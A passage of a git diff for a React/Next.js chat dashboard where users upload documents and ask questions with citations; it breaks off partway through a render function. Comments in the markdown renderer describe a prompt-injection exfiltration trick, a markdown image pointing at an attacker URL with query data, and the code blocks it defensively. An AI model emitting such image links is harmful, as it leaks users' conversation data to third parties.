@@ -1,16 +1,20 @@
 "use client";
 
 import React, { useState, useRef, useEffect, useCallback } from 'react';
-import ReactMarkdown from 'react-markdown';
+import ReactMarkdown, { type Components } from 'react-markdown';
+import remarkGfm from 'remark-gfm';
 import { useRouter, useSearchParams, usePathname } from 'next/navigation';
 import {
-  MessageSquare, Plus, FileText, Send, Paperclip, X,
-  Loader2, CheckCircle2, AlertCircle, RefreshCw, Pencil, Trash2, FolderOpen,
-  PanelLeftClose, PanelRightClose, History, BookOpen, Link2, Sparkles
+  MessageSquare, Plus, FileText, Send, Paperclip,
+  Loader2, AlertCircle, RefreshCw, Pencil, Trash2, FolderOpen,
+  PanelLeftClose, PanelRightClose, History, BookOpen, Link2,
 } from 'lucide-react';
-import { apiFetch as sharedApiFetch, ApiError } from '@/lib/api';
+import { apiFetch } from '@/lib/api';
+import { useLocalStorage } from '@/lib/useClientState';
+import { LogoMark } from '@/components/brand/Logo';
+import { Dialog, ConfirmDialog, buttonStyles } from '@/components/ui/Dialog';
 import { ToastContainer, Toast } from '@/components/chat/ToastContainer';
-import { KnowledgeBaseView, DocumentRecord } from '@/components/chat/KnowledgeBaseView';
+import { KnowledgeBaseView, DocumentRecord, PENDING_DOCUMENT_PREFIX } from '@/components/chat/KnowledgeBaseView';
 import UploadProgressModal, { UploadFileItem } from '@/components/chat/UploadProgressModal';
 
 // ── Types ──
@@ -24,10 +28,6 @@ interface Citation {
   page_end?: number;
   section_title?: string;
   content: string;
-  embedding_score?: number;
-  lexical_score?: number;
-  rrf_score?: number;
-  rerank_score?: number;
 }
 
 interface ChatMessage {
@@ -44,104 +44,202 @@ interface ChatSession {
   created_at?: string;
 }
 
-export default function SecureBrainDashboard({ boxId, boxName }: { boxId: string, boxName: string }) {
-  const [activeSource, setActiveSource] = useState<{ citations: Citation[], focusIdx: number } | null>(null);
-  const [historyOpen, setHistoryOpen] = useState(true);
-  const [historyWidth, setHistoryWidth] = useState(256);
-  const [sourceWidth, setSourceWidth] = useState(420);
-  const resizingRef = useRef<null | 'history' | 'source'>(null);
-  const [messages, setMessages] = useState<ChatMessage[]>([]);
-  const [inputText, setInputText] = useState("");
-  const [isProcessing, setIsProcessing] = useState(false);
-  const [isUploading, setIsUploading] = useState(false);
+interface ChatResponse {
+  answer: string;
+  citations?: Citation[];
+  closest_matches?: Citation[];
+}
+
+/** Upload row plus the ids of same-named, already-indexed documents that must not count as this upload finishing. */
+type TrackedUpload = UploadFileItem & { ignoreIds: string[] };
+
+interface PanelPrefs {
+  historyOpen: boolean;
+  sourceOpen: boolean;
+  historyWidth: number;
+  sourceWidth: number;
+}
+
+const DEFAULT_PANELS: PanelPrefs = { historyOpen: true, sourceOpen: false, historyWidth: 256, sourceWidth: 420 };
+const SUPPORTED_EXTENSIONS = new Set(['pdf', 'txt', 'docx', 'csv', 'xlsx']);
+const MAX_UPLOAD_BYTES = 25 * 1024 * 1024;
+const MAX_INPUT_HEIGHT = 200;
+
+const isDesktop = () => window.matchMedia('(min-width: 768px)').matches;
+const errorText = (err: unknown, fallback: string) => (err instanceof Error && err.message ? err.message : fallback);
+const isReady = (doc: DocumentRecord) => doc.status === 'completed' || doc.status === 'indexed';
+
+// react-markdown passes its syntax-tree `node` to custom components; keep it off DOM elements.
+function domProps<P extends { node?: unknown }>(props: P): Omit<P, 'node'> {
+  const { node, ...rest } = props;
+  void node;
+  return rest;
+}
+
+// Answers are structured markdown (headings, lists, tables). Tailwind's reset strips list
+// markers and heading sizes and no typography plugin is installed, so style them here.
+const ANSWER_MARKDOWN_STYLES: Components = {
+  h1: (props) => <h3 className="text-base font-semibold text-slate-900 mt-4 mb-2 first:mt-0" {...domProps(props)} />,
+  h2: (props) => <h3 className="text-base font-semibold text-slate-900 mt-4 mb-2 first:mt-0" {...domProps(props)} />,
+  h3: (props) => <h4 className="text-[15px] font-semibold text-slate-900 mt-3 mb-1.5 first:mt-0" {...domProps(props)} />,
+  h4: (props) => <h5 className="text-[15px] font-medium text-slate-900 mt-3 mb-1 first:mt-0" {...domProps(props)} />,
+  p: (props) => <p className="my-2 first:mt-0 last:mb-0" {...domProps(props)} />,
+  ul: (props) => <ul className="list-disc pl-5 my-2 space-y-1" {...domProps(props)} />,
+  ol: (props) => <ol className="list-decimal pl-5 my-2 space-y-1" {...domProps(props)} />,
+  li: (props) => <li className="pl-1" {...domProps(props)} />,
+  strong: (props) => <strong className="font-semibold text-slate-900" {...domProps(props)} />,
+  blockquote: (props) => <blockquote className="border-l-2 border-slate-200 pl-3 my-2 text-slate-600" {...domProps(props)} />,
+  code: (props) => <code className="rounded bg-slate-100 px-1 py-0.5 font-mono text-[13px]" {...domProps(props)} />,
+  // Wide comparison tables scroll inside the message instead of widening the page.
+  table: (props) => (
+    <div className="my-3 overflow-x-auto">
+      <table className="w-full border-collapse text-sm" {...domProps(props)} />
+    </div>
+  ),
+  thead: (props) => <thead className="bg-slate-50" {...domProps(props)} />,
+  th: (props) => <th className="border border-slate-200 px-3 py-2 text-left font-semibold text-slate-900 align-top" {...domProps(props)} />,
+  td: (props) => <td className="border border-slate-200 px-3 py-2 align-top" {...domProps(props)} />,
+};
+
+const citationLabel = (c: Citation) => {
+  let label = c.filename;
+  if (c.page_start) label += ` • p.${c.page_start}${c.page_end && c.page_end !== c.page_start ? `–${c.page_end}` : ''}`;
+  if (c.section_title) label += `, ${c.section_title}`;
+  return label;
+};
+
+const citationKey = (c: Citation) => c.evidence_id || c.filename;
+
+/** Turns [E1] / 【1】 markers into #cite-N links that render as citation buttons. */
+function linkCitationMarkers(content: string, citations?: Citation[]) {
+  return content.replace(/(?:\[|【)(E?\d+)(?:\]|】)/g, (match, p1: string) => {
+    if (!citations) return match;
+    const searchId = p1.startsWith('E') ? p1 : `E${p1}`;
+    let idx = citations.findIndex(c => c.evidence_id === searchId);
+    if (idx === -1) {
+      const num = parseInt(p1.replace('E', ''));
+      if (!isNaN(num) && num > 0 && num <= citations.length) idx = num - 1;
+    }
+    if (idx !== -1) return `[${match}](#cite-${idx})`;
+    return match;
+  });
+}
+
+function AnswerMarkdown({ message, onCite }: { message: ChatMessage; onCite: (citations: Citation[], focusIdx: number) => void }) {
+  const citations = message.citations;
+  return (
+    <ReactMarkdown
+      remarkPlugins={[remarkGfm]}
+      components={{
+        ...ANSWER_MARKDOWN_STYLES,
+        a: (allProps) => {
+          const props = domProps(allProps);
+          if (props.href?.startsWith('#cite-') && citations) {
+            const cIdx = parseInt(props.href.replace('#cite-', ''));
+            const clicked = citations[cIdx];
+            if (clicked) {
+              return (
+                <button
+                  type="button"
+                  onClick={() => {
+                    const sameSource = citations.filter(orig => citationKey(orig) === citationKey(clicked));
+                    const focusIdx = sameSource.findIndex(orig => orig === clicked);
+                    onCite(sameSource, focusIdx === -1 ? 0 : focusIdx);
+                  }}
+                  className="inline-flex items-center justify-center px-1.5 py-0.5 rounded bg-indigo-50 border border-indigo-200 text-indigo-700 hover:bg-indigo-100 font-mono text-[10px] font-bold mx-0.5 align-baseline transition-colors"
+                  aria-label={`Source: ${citationLabel(clicked)}`}
+                  title={clicked.filename}
+                >
+                  {props.children}
+                </button>
+              );
+            }
+          }
+          // Answers can echo text planted in uploaded documents, so links are
+          // limited to http(s) and opened without leaking referrer or opener.
+          const href = props.href || '';
+          if (!/^https?:\/\//i.test(href)) return <span>{props.children}</span>;
+          return <a {...props} className="text-indigo-700 underline underline-offset-2" target="_blank" rel="noopener noreferrer nofollow" referrerPolicy="no-referrer" />;
+        },
+        // Never fetch remote images: a prompt-injected ![](https://attacker/?q=...)
+        // would otherwise send conversation data to a third party on render.
+        img: ({ alt }) => (alt ? <span>[image: {alt}]</span> : null),
+      }}
+    >
+      {linkCitationMarkers(message.content, citations)}
+    </ReactMarkdown>
+  );
+}
+
+export default function ChatDashboard({ boxId, boxName }: { boxId: string, boxName: string }) {
   const searchParams = useSearchParams();
   const router = useRouter();
   const pathname = usePathname();
-
-  const viewParam = searchParams.get('view');
-  const currentView = viewParam === 'chat' ? 'chat' : 'documents';
+  const currentView = searchParams.get('view') === 'chat' ? 'chat' : 'documents';
 
   const setCurrentView = (view: 'chat' | 'documents') => {
     const params = new URLSearchParams(searchParams.toString());
-    if (view === 'documents') {
-      params.delete('view');
-    } else {
-      params.set('view', view);
-    }
-    router.push(`${pathname}?${params.toString()}`);
+    if (view === 'documents') params.delete('view');
+    else params.set('view', view);
+    const query = params.toString();
+    router.push(query ? `${pathname}?${query}` : pathname);
   };
 
+  const [panels, setPanels] = useLocalStorage<PanelPrefs>('docintel.chat.panels', DEFAULT_PANELS);
+  const [mobilePanel, setMobilePanel] = useState<'history' | 'sources' | null>(null);
+  const [activeSource, setActiveSource] = useState<{ citations: Citation[], focusIdx: number } | null>(null);
+  const [messages, setMessages] = useState<ChatMessage[]>([]);
+  const [inputText, setInputText] = useState('');
+  const [isProcessing, setIsProcessing] = useState(false);
+  const [loadingHistory, setLoadingHistory] = useState(false);
+  const [isUploading, setIsUploading] = useState(false);
   const [documents, setDocuments] = useState<DocumentRecord[]>([]);
   const [sessionId, setSessionId] = useState<string | null>(null);
   const [recentChats, setRecentChats] = useState<ChatSession[]>([]);
   const [toasts, setToasts] = useState<Toast[]>([]);
-  const [showSourcePanel, setShowSourcePanel] = useState(false);
-  const [uploadFileItems, setUploadFileItems] = useState<UploadFileItem[]>([]);
+  const [uploads, setUploads] = useState<TrackedUpload[]>([]);
   const [showUploadModal, setShowUploadModal] = useState(false);
+  const [renameTarget, setRenameTarget] = useState<ChatSession | null>(null);
+  const [renameValue, setRenameValue] = useState('');
+  const [renameError, setRenameError] = useState<string | null>(null);
+  const [renaming, setRenaming] = useState(false);
+  const [deleteTarget, setDeleteTarget] = useState<ChatSession | null>(null);
 
   const messagesEndRef = useRef<HTMLDivElement>(null);
   const fileInputRef = useRef<HTMLInputElement>(null);
+  const inputRef = useRef<HTMLTextAreaElement>(null);
+  const workspaceRef = useRef<HTMLDivElement>(null);
+  const resizingRef = useRef<null | 'history' | 'source'>(null);
+  // Bumped whenever the visible conversation changes, so late responses for the
+  // previous conversation are dropped instead of being shown in the wrong one.
+  const conversationToken = useRef(0);
 
-  // Monotonic ids: Date.now() repeats when several toasts fire in the same millisecond
-  // (e.g. a multi-file upload failing at once), which breaks React keys.
+  // Monotonic ids: Date.now() repeats when several toasts fire in the same millisecond.
   const toastSeq = useRef(0);
-  const showToast = useCallback((message: string, type: 'success' | 'error' | 'warning') => {
+  const showToast = useCallback((message: string, type: Toast['type']) => {
     const id = ++toastSeq.current;
     setToasts(prev => [...prev, { id, message, type }]);
-    setTimeout(() => setToasts(prev => prev.filter(t => t.id !== id)), 4000);
+    setTimeout(() => setToasts(prev => prev.filter(t => t.id !== id)), type === 'success' ? 4000 : 7000);
   }, []);
 
   const dismissToast = useCallback((id: number) => {
     setToasts(prev => prev.filter(t => t.id !== id));
   }, []);
 
-  const apiFetch = useCallback(async (path: string, options?: RequestInit) => {
-    try {
-      return await sharedApiFetch(path, options);
-    } catch (err: unknown) {
-      if (err instanceof ApiError) {
-        if (err.status === 429) {
-          showToast("Rate limited — please wait a moment and try again", "warning");
-          throw new Error("rate_limited");
-        }
-        if (err.status === 409) {
-          showToast(err.detail as string || "Duplicate file detected", "warning");
-          throw new Error("duplicate");
-        }
-        showToast(err.detail as string || "Something went wrong", "error");
-        throw new Error(err.detail as string || `HTTP ${err.status}`);
-      }
-      showToast(err instanceof Error ? err.message : "Something went wrong", "error");
-      throw err;
-    }
-  }, [showToast]);
-
   useEffect(() => {
-    messagesEndRef.current?.scrollIntoView({ behavior: "smooth" });
-  }, [messages]);
+    messagesEndRef.current?.scrollIntoView({ behavior: 'smooth' });
+  }, [messages, isProcessing]);
 
-  // ── Panel layout persistence ──
-  useEffect(() => {
-    try {
-      const saved = JSON.parse(localStorage.getItem('docintel.panels') || '{}');
-      if (typeof saved.historyOpen === 'boolean') setHistoryOpen(saved.historyOpen);
-      if (typeof saved.sourceOpen === 'boolean') setShowSourcePanel(saved.sourceOpen);
-      if (typeof saved.historyWidth === 'number') setHistoryWidth(saved.historyWidth);
-      if (typeof saved.sourceWidth === 'number') setSourceWidth(saved.sourceWidth);
-    } catch { }
-  }, []);
-
-  useEffect(() => {
-    localStorage.setItem('docintel.panels', JSON.stringify({ historyOpen, sourceOpen: showSourcePanel, historyWidth, sourceWidth }));
-  }, [historyOpen, showSourcePanel, historyWidth, sourceWidth]);
-
-  // ── Drag-to-resize ──
+  // ── Drag-to-resize (desktop panels) ──
   useEffect(() => {
     const onMove = (e: MouseEvent) => {
       if (resizingRef.current === 'history') {
-        setHistoryWidth(Math.min(420, Math.max(200, e.clientX - (document.getElementById('chat-main')?.getBoundingClientRect().left || 0))));
+        const left = workspaceRef.current?.getBoundingClientRect().left ?? 0;
+        const historyWidth = Math.min(420, Math.max(200, e.clientX - left));
+        setPanels(p => ({ ...p, historyWidth }));
       } else if (resizingRef.current === 'source') {
-        setSourceWidth(Math.min(760, Math.max(300, window.innerWidth - e.clientX)));
+        const sourceWidth = Math.min(760, Math.max(300, window.innerWidth - e.clientX));
+        setPanels(p => ({ ...p, sourceWidth }));
       }
     };
     const onUp = () => {
@@ -154,483 +252,543 @@ export default function SecureBrainDashboard({ boxId, boxName }: { boxId: string
     window.addEventListener('mousemove', onMove);
     window.addEventListener('mouseup', onUp);
     return () => { window.removeEventListener('mousemove', onMove); window.removeEventListener('mouseup', onUp); };
-  }, []);
+  }, [setPanels]);
 
-  const startResize = (side: 'history' | 'source') => (e: React.MouseEvent) => {
+  const startResize = (e: React.MouseEvent, side: 'history' | 'source') => {
     e.preventDefault();
     resizingRef.current = side;
     document.body.style.cursor = 'col-resize';
     document.body.style.userSelect = 'none';
   };
 
-  const citationLabel = (c: Citation) => {
-    let label = c.filename;
-    if (c.page_start) label += ` • p.${c.page_start}${c.page_end && c.page_end !== c.page_start ? `–${c.page_end}` : ''}`;
-    if (c.section_title) label += `, ${c.section_title}`;
-    return label;
+  const toggleHistory = () => {
+    if (isDesktop()) setPanels(p => ({ ...p, historyOpen: !p.historyOpen }));
+    else setMobilePanel('history');
+  };
+
+  const toggleSources = () => {
+    if (isDesktop()) setPanels(p => ({ ...p, sourceOpen: !p.sourceOpen }));
+    else setMobilePanel('sources');
   };
 
   const openCitation = (citations: Citation[], focusIdx: number) => {
     setActiveSource({ citations, focusIdx });
-    setShowSourcePanel(true);
+    const desktop = isDesktop();
+    if (desktop) setPanels(p => ({ ...p, sourceOpen: true }));
+    else setMobilePanel('sources');
     setTimeout(() => {
-      document.getElementById(`cite-${focusIdx}`)?.scrollIntoView({ behavior: 'smooth', block: 'center' });
+      document.getElementById(`${desktop ? 'panel' : 'sheet'}-cite-${focusIdx}`)?.scrollIntoView({ behavior: 'smooth', block: 'center' });
     }, 80);
   };
 
-  const fetchDocuments = useCallback(async () => {
+  // ── Data loading ──
+
+  const applyDocuments = useCallback((serverDocs: DocumentRecord[]) => {
+    // Keep optimistic rows for uploads the server doesn't list yet (or that failed before reaching it).
+    setDocuments(prev => [
+      ...prev.filter(d => d.id.startsWith(PENDING_DOCUMENT_PREFIX) && !serverDocs.some(s => s.filename === d.filename)),
+      ...serverDocs,
+    ]);
+  }, []);
+
+  // Background refreshes (polling, after uploads) stay quiet; the first load reports problems.
+  const refreshDocuments = useCallback(() => {
+    apiFetch<{ data?: DocumentRecord[] }>(`/api/v1/documents/?box_id=${boxId}`)
+      .then(data => applyDocuments(data.data ?? []))
+      .catch(() => {});
+  }, [boxId, applyDocuments]);
+
+  useEffect(() => {
+    let cancelled = false;
+    apiFetch<{ data?: DocumentRecord[] }>(`/api/v1/documents/?box_id=${boxId}`)
+      .then(data => { if (!cancelled) applyDocuments(data.data ?? []); })
+      .catch(err => { if (!cancelled) showToast(errorText(err, 'Couldn’t load documents.'), 'error'); });
+    return () => { cancelled = true; };
+  }, [boxId, applyDocuments, showToast]);
+
+  // Poll while anything is still processing in the background.
+  const hasProcessing = documents.some(doc => doc.status === 'processing' && !doc.id.startsWith(PENDING_DOCUMENT_PREFIX));
+  useEffect(() => {
+    if (!hasProcessing) return;
+    const id = window.setInterval(refreshDocuments, 3000);
+    return () => window.clearInterval(id);
+  }, [hasProcessing, refreshDocuments]);
+
+  useEffect(() => {
+    let cancelled = false;
+    apiFetch<{ sessions?: ChatSession[] }>(`/api/v1/chat/sessions?box_id=${boxId}`)
+      .then(data => { if (!cancelled) setRecentChats(data.sessions ?? []); })
+      .catch(err => { if (!cancelled) showToast(errorText(err, 'Couldn’t load conversations.'), 'error'); });
+    return () => { cancelled = true; };
+  }, [boxId, showToast]);
+
+  // ── Conversations ──
+
+  const startNewChat = () => {
+    conversationToken.current++;
+    setSessionId(null);
+    setMessages([]);
+    setActiveSource(null);
+    setLoadingHistory(false);
+    setIsProcessing(false);
+    setMobilePanel(null);
+    inputRef.current?.focus();
+  };
+
+  const selectSession = async (id: string) => {
+    setMobilePanel(null);
+    if (id === sessionId) return;
+    const token = ++conversationToken.current;
+    setSessionId(id);
+    setMessages([]);
+    setActiveSource(null);
+    setIsProcessing(false);
+    setLoadingHistory(true);
     try {
-      const data = await apiFetch(`/api/v1/documents/?box_id=${boxId}`);
-      if (data.data) {
-        setDocuments(data.data);
-      }
-    } catch {
-      // apiFetch already displays a helpful error.
+      const data = await apiFetch<{ history: { role: string; content: string }[] }>(`/api/v1/chat/sessions/${id}?box_id=${boxId}`);
+      if (conversationToken.current !== token) return;
+      setMessages(data.history.map(m => ({ role: m.role === 'assistant' ? 'ai' : 'user', content: m.content })));
+    } catch (err) {
+      if (conversationToken.current === token) showToast(errorText(err, 'Couldn’t load this conversation.'), 'error');
+    } finally {
+      if (conversationToken.current === token) setLoadingHistory(false);
     }
-  }, [apiFetch, boxId]);
+  };
 
-  useEffect(() => {
-    fetchDocuments();
-  }, [fetchDocuments]);
+  const openRename = (chat: ChatSession) => {
+    setMobilePanel(null);
+    setRenameTarget(chat);
+    setRenameValue(chat.title);
+    setRenameError(null);
+  };
 
-  // Polling for processing documents
-  useEffect(() => {
-    const hasProcessing = documents.some(doc => doc.status === 'processing');
-    let timeoutId: number;
-    if (hasProcessing) {
-      timeoutId = window.setTimeout(() => { fetchDocuments(); }, 3000);
-    }
-    return () => { if (timeoutId) window.clearTimeout(timeoutId); };
-  }, [documents, fetchDocuments]);
-
-  const fetchChatSessions = useCallback(async () => {
+  const submitRename = async (e: React.FormEvent) => {
+    e.preventDefault();
+    if (!renameTarget) return;
+    const title = renameValue.trim();
+    if (!title) { setRenameError('Enter a name for this conversation.'); return; }
+    if (title === renameTarget.title) { setRenameTarget(null); return; }
+    setRenaming(true);
+    setRenameError(null);
     try {
-      const data = await apiFetch(`/api/v1/chat/sessions?box_id=${boxId}`);
-      setRecentChats(data.sessions || []);
-    } catch {
-      // apiFetch already displays a helpful error.
+      await apiFetch(`/api/v1/chat/sessions/${renameTarget.id}?box_id=${boxId}`, {
+        method: 'PATCH',
+        body: JSON.stringify({ title }),
+      });
+      setRecentChats(prev => prev.map(item => item.id === renameTarget.id ? { ...item, title } : item));
+      setRenameTarget(null);
+    } catch (err) {
+      setRenameError(errorText(err, 'Couldn’t rename this conversation.'));
+    } finally {
+      setRenaming(false);
     }
-  }, [apiFetch, boxId]);
+  };
 
-  useEffect(() => { fetchChatSessions(); }, [fetchChatSessions]);
+  const confirmDeleteChat = async () => {
+    if (!deleteTarget) return;
+    await apiFetch(`/api/v1/chat/sessions/${deleteTarget.id}?box_id=${boxId}`, { method: 'DELETE' });
+    setRecentChats(prev => prev.filter(item => item.id !== deleteTarget.id));
+    if (sessionId === deleteTarget.id) startNewChat();
+    showToast('Conversation deleted', 'success');
+  };
 
-  useEffect(() => {
-    if (!sessionId) return;
-    const loadHistory = async () => {
-      try {
-        const data = await apiFetch(`/api/v1/chat/sessions/${sessionId}?box_id=${boxId}`);
-        setMessages(data.history.map((m: { role: string; content: string }) => ({
-          role: m.role === 'assistant' ? 'ai' : 'user',
-          content: m.content
-        })));
-      } catch {
-        showToast("Failed to load chat history", "error");
-      }
-    };
-    loadHistory();
-  }, [sessionId, boxId, apiFetch, showToast]);
+  // ── Uploads ──
 
   const uploadFiles = async (fileList: FileList | File[]) => {
     const files = Array.from(fileList);
-    if (!files.length) return;
-    const MAX_SIZE = 25 * 1024 * 1024; // 25 MB
-    const supportedExtensions = new Set(['pdf', 'txt', 'docx', 'csv', 'xlsx']);
-    
-    const validFormatFiles = files.filter((file) => supportedExtensions.has(file.name.split('.').pop()?.toLowerCase() || ''));
+    // Reset so choosing the same file again still fires a change event.
+    if (fileInputRef.current) fileInputRef.current.value = '';
+    if (!files.length || isUploading) return;
+
+    const validFormatFiles = files.filter(file => SUPPORTED_EXTENSIONS.has(file.name.split('.').pop()?.toLowerCase() || ''));
     if (validFormatFiles.length !== files.length) {
-      showToast('Only PDF, DOCX, TXT, CSV, and XLSX files are supported.', 'warning');
+      showToast('Only PDF, DOCX, TXT, CSV and XLSX files are supported.', 'warning');
     }
-
-    const validFiles = validFormatFiles.filter((file) => file.size <= MAX_SIZE);
+    const validFiles = validFormatFiles.filter(file => file.size <= MAX_UPLOAD_BYTES);
     if (validFiles.length !== validFormatFiles.length) {
-      showToast('One or more files exceed the 25 MB size limit.', 'error');
+      showToast('Files larger than 25 MB were skipped.', 'warning');
     }
-    
-    if (!validFiles.length) {
-      if (fileInputRef.current) fileInputRef.current.value = '';
-      return;
-    }
+    if (!validFiles.length) return;
 
+    const names = new Set(validFiles.map(f => f.name));
+    const addedAt = new Date().toISOString();
     setIsUploading(true);
-
-    // Build modal items for each file
-    const newItems: UploadFileItem[] = validFiles.map(f => ({
+    setUploads(validFiles.map(f => ({
       filename: f.name,
       size: f.size,
-      status: 'queued' as const,
-      progress: 0,
-    }));
-    setUploadFileItems(newItems);
+      status: 'uploading',
+      ignoreIds: documents.filter(d => d.filename === f.name && isReady(d)).map(d => d.id),
+    })));
     setShowUploadModal(true);
-
-    setDocuments((previous) => [
-      ...validFiles.filter((file) => !previous.some((document) => document.filename === file.name)).map((file) => ({ filename: file.name, size: file.size, status: 'processing' as const })),
-      ...previous,
+    setDocuments(prev => [
+      ...validFiles
+        .filter(file => !prev.some(d => d.filename === file.name))
+        .map((file): DocumentRecord => ({ id: `${PENDING_DOCUMENT_PREFIX}${file.name}`, filename: file.name, status: 'processing', created_at: addedAt })),
+      // A re-upload of a failed document is retried by the server under the same record.
+      ...prev.map(d => names.has(d.filename) && d.status === 'failed' ? { ...d, status: 'processing' as const, error_message: undefined } : d),
     ]);
 
-    await Promise.all(validFiles.map(async (file, idx) => {
-      // Mark as processing
-      setUploadFileItems(prev => prev.map((item, i) =>
-        i === idx ? { ...item, status: 'processing' as const, progress: 15, statusMessage: 'Uploading file...' } : item
-      ));
-
+    await Promise.all(validFiles.map(async file => {
+      const update = (patch: Partial<UploadFileItem>) =>
+        setUploads(prev => prev.map(item => item.filename === file.name ? { ...item, ...patch } : item));
       const formData = new FormData();
       formData.append('file', file);
       formData.append('box_id', boxId);
       try {
-        // Simulate progress steps
-        setUploadFileItems(prev => prev.map((item, i) =>
-          i === idx ? { ...item, progress: 45, statusMessage: 'Extracting content' } : item
-        ));
-        const data = await apiFetch('/api/v1/upload/box', { method: 'POST', body: formData });
-        setUploadFileItems(prev => prev.map((item, i) =>
-          i === idx ? { ...item, status: 'indexing' as const, progress: 72, statusMessage: 'Generating vectors' } : item
-        ));
-        // Brief delay for visual feedback, then mark ready
-        await new Promise(resolve => setTimeout(resolve, 600));
-        setUploadFileItems(prev => prev.map((item, i) =>
-          i === idx ? { ...item, status: 'ready' as const, progress: 100, statusMessage: data.message || 'Indexed and ready' } : item
-        ));
-      } catch (err: any) {
-        setUploadFileItems(prev => prev.map((item, i) =>
-          i === idx ? { ...item, status: 'failed' as const, progress: 0, statusMessage: err.message || 'Processing failed' } : item
-        ));
-        setDocuments((previous) => previous.map((document) => document.filename === file.name ? { ...document, status: 'failed' } : document));
+        await apiFetch('/api/v1/upload/box', { method: 'POST', body: formData });
+        update({ status: 'processing' });
+      } catch (err) {
+        const message = errorText(err, 'Upload failed.');
+        update({ status: 'failed', message });
+        setDocuments(prev => prev.map(d => d.id === `${PENDING_DOCUMENT_PREFIX}${file.name}` ? { ...d, status: 'failed', error_message: message } : d));
       }
     }));
 
-    if (fileInputRef.current) fileInputRef.current.value = '';
     setIsUploading(false);
-    // Refresh documents list after batch completes
-    fetchDocuments();
+    refreshDocuments();
   };
 
-  const handleFileUpload = (event: React.ChangeEvent<HTMLInputElement>) => uploadFiles(event.target.files || []);
+  // Upload rows that the server accepted finish when the document list says so.
+  const uploadView: UploadFileItem[] = uploads.map(({ ignoreIds, ...item }) => {
+    if (item.status !== 'processing') return item;
+    const doc = documents.find(d => d.filename === item.filename && !d.id.startsWith(PENDING_DOCUMENT_PREFIX) && !ignoreIds.includes(d.id));
+    if (doc?.status === 'failed') return { ...item, status: 'failed', message: doc.error_message || 'Processing failed.' };
+    if (doc && isReady(doc)) return { ...item, status: 'ready' };
+    return item;
+  });
 
-  const handleRenameChat = async (chat: ChatSession) => {
-    const title = window.prompt('Rename conversation', chat.title)?.trim();
-    if (!title || title === chat.title) return;
-    try {
-      await apiFetch(`/api/v1/chat/sessions/${chat.id}?box_id=${boxId}`, {
-        method: 'PATCH',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ title }),
-      });
-      setRecentChats(previous => previous.map(item => item.id === chat.id ? { ...item, title } : item));
-      showToast('Conversation renamed', 'success');
-    } catch { }
+  const handleDeleteFile = async (documentId: string) => {
+    if (!documentId.startsWith(PENDING_DOCUMENT_PREFIX)) {
+      await apiFetch(`/api/v1/documents/${documentId}?box_id=${boxId}`, { method: 'DELETE' });
+    }
+    setDocuments(prev => prev.filter(document => document.id !== documentId));
+    showToast('Document deleted', 'success');
   };
 
-  const handleDeleteChat = async (chat: ChatSession) => {
-    if (!window.confirm(`Delete "${chat.title}"? This cannot be undone.`)) return;
-    try {
-      await apiFetch(`/api/v1/chat/sessions/${chat.id}?box_id=${boxId}`, { method: 'DELETE' });
-      setRecentChats(previous => previous.filter(item => item.id !== chat.id));
-      if (sessionId === chat.id) {
-        setSessionId(null);
-        setMessages([]);
-      }
-      showToast('Conversation deleted', 'success');
-    } catch { }
-  };
+  // ── Asking ──
 
   const handleSendMessage = async (retryContent?: string) => {
     const userQuery = retryContent || inputText.trim();
     if (!userQuery || isProcessing) return;
+    const token = conversationToken.current;
 
     if (!retryContent) {
-      setInputText("");
+      setInputText('');
+      if (inputRef.current) inputRef.current.style.height = 'auto';
       setMessages(prev => [...prev, { role: 'user', content: userQuery }]);
     }
     setIsProcessing(true);
 
+    const showError = (content: string) => setMessages(prev => [
+      ...(retryContent ? prev.filter(m => !m.error) : prev),
+      { role: 'ai', content, error: true },
+    ]);
+
     let currentSid = sessionId;
     if (!currentSid) {
       try {
-        const data = await apiFetch("/api/v1/chat/sessions", {
-          method: "POST",
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({ box_id: boxId, title: userQuery.slice(0, 30) })
+        const title = userQuery.slice(0, 60);
+        const data = await apiFetch<{ session_id: string }>('/api/v1/chat/sessions', {
+          method: 'POST',
+          body: JSON.stringify({ box_id: boxId, title }),
         });
+        if (conversationToken.current !== token) return;
         currentSid = data.session_id;
         setSessionId(currentSid);
-        setRecentChats(prev => [{ id: data.session_id, title: userQuery.slice(0, 30) || 'New Conversation' }, ...prev]);
-      } catch {
-        showToast("Failed to create chat session", "error");
+        setRecentChats(prev => [{ id: data.session_id, title: title || 'New conversation', created_at: new Date().toISOString() }, ...prev]);
+      } catch (err) {
+        if (conversationToken.current !== token) return;
+        showError(errorText(err, 'Couldn’t start a conversation. Please try again.'));
         setIsProcessing(false);
         return;
       }
     }
 
     try {
-      const data = await apiFetch("/api/v1/chat/", {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ question: userQuery, box_id: boxId, session_id: currentSid })
+      const data = await apiFetch<ChatResponse>('/api/v1/chat/', {
+        method: 'POST',
+        body: JSON.stringify({ question: userQuery, box_id: boxId, session_id: currentSid }),
       });
-      setMessages(prev => {
-        const filtered = retryContent ? prev.filter(m => !(m.error && m.role === 'ai')) : prev;
-        return [...filtered, { role: 'ai', content: data.answer, citations: data.citations, closest_matches: data.closest_matches }];
-      });
-    } catch {
-      setMessages(prev => [...prev, { role: 'ai', content: "I couldn't reach the server. Click retry or try again in a moment.", error: true }]);
+      if (conversationToken.current !== token) return;
+      setMessages(prev => [
+        ...(retryContent ? prev.filter(m => !m.error) : prev),
+        { role: 'ai', content: data.answer, citations: data.citations, closest_matches: data.closest_matches },
+      ]);
+    } catch (err) {
+      if (conversationToken.current !== token) return;
+      showError(errorText(err, 'I couldn’t reach the server. Please try again.'));
     } finally {
-      setIsProcessing(false);
+      if (conversationToken.current === token) setIsProcessing(false);
     }
   };
 
-  const handleDeleteFile = async (documentId: string) => {
-    try {
-      await apiFetch(`/api/v1/documents/${documentId}?box_id=${boxId}`, { method: "DELETE" });
-      setDocuments(prev => prev.filter(document => document.id !== documentId));
-      showToast(`Deleted document`, "success");
-    } catch { }
+  const resizeInput = () => {
+    const el = inputRef.current;
+    if (!el) return;
+    el.style.height = 'auto';
+    el.style.height = `${Math.min(el.scrollHeight, MAX_INPUT_HEIGHT)}px`;
   };
 
-  const activeDocCount = documents.filter(d => d.status !== 'failed').length;
+  const readyCount = documents.filter(isReady).length;
+
+  // ── Panel content (shared by the desktop sidebars and the mobile sheets) ──
+
+  const renderHistoryList = () => (
+    recentChats.length === 0 ? (
+      <p className="text-xs text-slate-500 text-center mt-6">No conversations yet</p>
+    ) : (
+      <ul className="space-y-1">
